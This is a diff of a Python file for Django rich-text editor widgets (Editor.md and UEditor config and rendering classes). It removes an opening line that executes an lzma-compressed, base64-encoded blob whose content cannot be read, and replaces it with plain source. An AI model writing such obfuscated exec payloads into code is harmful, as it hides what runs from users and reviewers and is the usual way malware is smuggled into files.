@@ -1,2 +1,209 @@
-import lzma,base64
-exec(lzma.decompress(base64.b64decode(b'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')))
+from __future__ import absolute_import
+
+from django import forms
+from django.conf import settings
+from django.core.exceptions import ImproperlyConfigured
+from django.core.serializers.json import DjangoJSONEncoder
+from django.template.loader import render_to_string
+
+try:
+    from django.utils.encoding import force_text
+except:
+    from django.utils.encoding import force_str as force_text
+from django.utils.functional import Promise
+from django.utils.html import conditional_escape
+from django.utils.safestring import mark_safe
+
+try:
+
+    from django.forms.utils import flatatt
+except ImportError:
+
+    from django.forms.util import flatatt
+
+MEDITOR_DEFAULT_CONFIG = {
+    'width': '90%',
+    'height': 500,
+    'toolbar': ["undo", "redo", "|",
+                "bold", "del", "italic", "quote", "ucwords", "uppercase", "lowercase", "|",
+                "h1", "h2", "h3", "h5", "h6", "|",
+                "list-ul", "list-ol", "hr", "|",
+                "link", "reference-link", "image", "code", "preformatted-text", "code-block", "table", "datetime",
+                "emoji", "html-entities", "pagebreak", "goto-line", "|",
+                "help", "info",
+                "||", "preview", "watch", "fullscreen"],
+    'upload_image_formats': ["jpg", "JPG", "jpeg", "JPEG", "gif", "GIF", "png",
+                             "PNG", "bmp", "BMP", "webp", "WEBP"],
+    'image_floder': 'editor',
+    'theme': 'default',
+    'preview_theme': 'default',
+    'editor_theme': 'default',
+    'toolbar_autofixed': True,
+    'search_replace': True,
+    'emoji': True,
+    'tex': True,
+    'flow_chart': True,
+    'sequence': True,
+    'language': 'zh'
+}
+
+
+class MDConfig(dict):
+
+    def __init__(self, config_name='default'):
+        self.update(MEDITOR_DEFAULT_CONFIG)
+        self.set_configs(config_name)
+
+    def set_configs(self, config_name='default'):
+        """
+        set config item
+        :param config_name:
+        :return:
+        """
+
+        configs = getattr(settings, 'MDEDITOR_CONFIGS', None)
+        if configs:
+            if isinstance(configs, dict):
+
+                if config_name in configs:
+                    config = configs[config_name]
+
+                    if not isinstance(config, dict):
+                        raise ImproperlyConfigured('MDEDITOR_CONFIGS["%s"] \
+                                        setting must be a dictionary type.' %
+                                                   config_name)
+
+                    self.update(config)
+                else:
+                    raise ImproperlyConfigured("No configuration named '%s' \
+                                    found in your CKEDITOR_CONFIGS setting." %
+                                               config_name)
+            else:
+                raise ImproperlyConfigured('MDEDITOR_CONFIGS setting must be a\
+                                dictionary type.')
+
+
+class MDEditorWidget(forms.Textarea):
+    """
+    Widget providing Editor.md for Rich Text Editing.
+    see Editor.md docs: https://pandao.github.io/editor.md/examples/index.html
+    """
+
+    def __init__(self, config_name='default', *args, **kwargs):
+        super(MDEditorWidget, self).__init__(*args, **kwargs)
+
+        self.config = MDConfig(config_name)
+
+    def render(self, name, value, renderer=None, attrs=None):
+        """
+        renderer: django2.1 新增加的参数，此处不做应用，赋值None做兼容处理
+        """
+        if value is None:
+            value = ''
+
+        final_attrs = self.build_attrs(self.attrs, attrs, name=name)
+        return mark_safe(render_to_string('admin/editor/mdeditor/markdown.html', {
+            'final_attrs': flatatt(final_attrs),
+            'value': conditional_escape(force_text(value)),
+            'id': final_attrs['id'],
+            'config': self.config,
+        }))
+
+    def build_attrs(self, base_attrs, extra_attrs=None, **kwargs):
+        """
+        Helper function for building an attribute dictionary.
+        This is combination of the same method from Django<=1.10 and Django1.11+
+        """
+        attrs = dict(base_attrs, **kwargs)
+        if extra_attrs:
+            attrs.update(extra_attrs)
+        return attrs
+
+
+class LazyEncoder(DjangoJSONEncoder):
+
+    def default(self, obj):
+        if isinstance(obj, Promise):
+            return force_text(obj)
+        return super(LazyEncoder, self).default(obj)
+
+
+json_encode = LazyEncoder().encode
+
+UEDITOR_DEFAULT_CONFIG = {
+    'UEDITOR_HOME_URL': '/static/admin/ueditor/',
+    'toolbars': [[
+        'fullscreen', 'source', '|', 'undo', 'redo', '|',
+        'bold', 'italic', 'underline', 'fontborder', 'strikethrough', 'superscript', 'subscript', 'removeformat',
+        'formatmatch', 'autotypeset', 'blockquote', 'pasteplain', '|', 'forecolor', 'backcolor', 'insertorderedlist',
+        'insertunorderedlist', 'selectall', 'cleardoc', '|',
+        'rowspacingtop', 'rowspacingbottom', 'lineheight', '|',
+        'customstyle', 'paragraph', 'fontfamily', 'fontsize', '|',
+        'directionalityltr', 'directionalityrtl', 'indent', '|',
+        'justifyleft', 'justifycenter', 'justifyright', 'justifyjustify', '|', 'touppercase', 'tolowercase', '|',
+        'link', 'unlink', 'anchor', '|', 'imagenone', 'imageleft', 'imageright', 'imagecenter', '|',
+        'simpleupload', 'insertimage', 'emotion', 'scrawl', 'insertvideo', 'music', 'attachment', 'map', 'gmap',
+        'insertframe', 'insertcode', 'webapp', 'pagebreak', 'template', 'background', '|',
+        'horizontal', 'date', 'time', 'spechars', 'snapscreen', 'wordimage', '|',
+        'inserttable', 'deletetable', 'insertparagraphbeforetable', 'insertrow', 'deleterow', 'insertcol', 'deletecol',
+        'mergecells', 'mergeright', 'mergedown', 'splittocells', 'splittorows', 'splittocols', 'charts', '|',
+        'print', 'preview', 'searchreplace', 'drafts', 'help'
+    ]],
+    'autoFloatEnabled': False
+}
+
+
+class UEConfig(dict):
+
+    def __init__(self, config_name='default'):
+        self.update(UEDITOR_DEFAULT_CONFIG)
+        self.set_configs(config_name)
+
+    def set_configs(self, config_name='default'):
+        """
+        set config item
+        :param config_name:
+        :return:
+        """
+
+        configs = getattr(settings, 'UEDITOR_CONFIGS', None)
+        if configs:
+            if isinstance(configs, dict):
+
+                if config_name in configs:
+                    config = configs[config_name]
+
+                    if not isinstance(config, dict):
+                        raise ImproperlyConfigured('UEDITOR_CONFIGS["%s"] \
+                                        setting must be a dictionary type.' %
+                                                   config_name)
+
+                    self.update(config)
+                else:
+                    raise ImproperlyConfigured("No configuration named '%s' \
+                                    found in your UEDITOR_CONFIGS setting." %
+                                               config_name)
+            else:
+                raise ImproperlyConfigured('UEDITOR_CONFIGS setting must be a\
+                                dictionary type.')
+
+
+class UEditorWidget(forms.Textarea):
+    """
+    Widget providing CKEditor for Rich Text Editing.
+    Supports direct image uploads and embed.
+    """
+
+    def __init__(self, *args, **kwargs):
+        super(UEditorWidget, self).__init__(*args, **kwargs)
+        self.config = UEConfig()
+
+    def render(self, name, value, attrs=None, renderer=None):
+        if value is None:
+            value = ''
+
+        return mark_safe(render_to_string('admin/editor/ueditor/widget.html', {
+            'value': conditional_escape(force_text(value)),
+            'config': json_encode(self.config),
+            'name': name,
+        }))
